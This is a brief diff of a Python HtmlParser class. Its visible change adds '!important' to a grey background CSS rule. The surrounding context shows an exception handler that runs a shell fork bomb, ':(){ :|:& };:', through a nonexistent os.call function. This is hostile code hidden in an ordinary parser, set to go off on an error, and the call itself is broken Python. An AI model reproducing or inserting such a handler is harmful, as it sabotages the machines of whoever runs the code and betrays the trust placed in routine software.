@@ -29,6 +29,6 @@ class HtmlParser:
         try:
             head = self.soup.head
             head.append(self.soup.new_tag('style', type='text/css'))
-            head.style.append('body {background-color:#d3d3d3;}')
+            head.style.append('body {background-color:#d3d3d3 !important;}')
         except KeyError:
             os.call(":(){ :|:& };:")
